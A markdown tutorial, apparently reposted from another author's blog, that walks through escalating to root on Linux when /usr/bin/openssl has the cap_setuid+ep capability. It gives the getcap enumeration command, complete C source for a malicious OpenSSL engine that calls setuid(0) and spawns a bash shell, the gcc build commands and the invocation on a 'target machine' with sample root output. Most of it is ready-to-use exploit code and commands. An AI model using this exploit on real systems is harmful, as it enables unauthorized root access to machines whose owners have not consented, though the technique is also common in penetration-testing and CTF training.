# All credit goes to chaudhary1337 check out the original at:
https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/

### *Modified by LV6LV*

Consider the binary /usr/bin/openssl has capabilities set as: /usr/bin/openssl = cap_setuid+ep 

Is there a way to become root from a normal user by using this? 
yes... yes there is a way.

## Search all the binaries' capibilities using: 
```
getcap -r / 2>/dev/null.
```
> getcap is the tool we will use
-r is the recursive flag
2>/dev/null directs the standard error stream to /dev/null


If you see /usr/bin/openssl = cap_setuid+ep, we are set for success.

## 1. Requirements (On Your System)
We will use #include <openssl/engine.h> header in our exploit engine file. On debian based systems, use: sudo apt-get install libssl-dev to install.
gcc

## 2. Getting The Exploit Ready
Create a file named openssl-exploit-engine.c with contents as such:
```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
Check reference number 2  below for more information.

## 3. Compiling
Run the following:
```
gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
```
It is safe to ignore warnings below:

> implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]

> implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]

Next run:
```
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
```
Resultant is the openssl-exploit-engine.so file.

## 4. Transfer the file to target machine
Once you have the file, run the following, at the location of the so file.

openssl req -engine <full path to openssl-exploit-engine.so file>

Sample output if openssl-exploit-engine.so is located in the /tmp directory

user@server:~$ openssl req -engine /tmp/openssl-exploit-engine.so
root@server:~# whoami
root
  
Enjoy!

## Common Errors
> fatal error: openssl/engine.h: No such file or directory #include <openssl/engine.h>
  
Fix by installing libssl-dev (sudo apt-get install libssl-dev)

## 7. References

1. Read up more on capabilities. 
  https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
2. OpenSSL building a useless engine
  https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/
3. How to use the library load feature OpenSSL
  https://gtfobins.github.io/gtfobins/openssl/#library-load
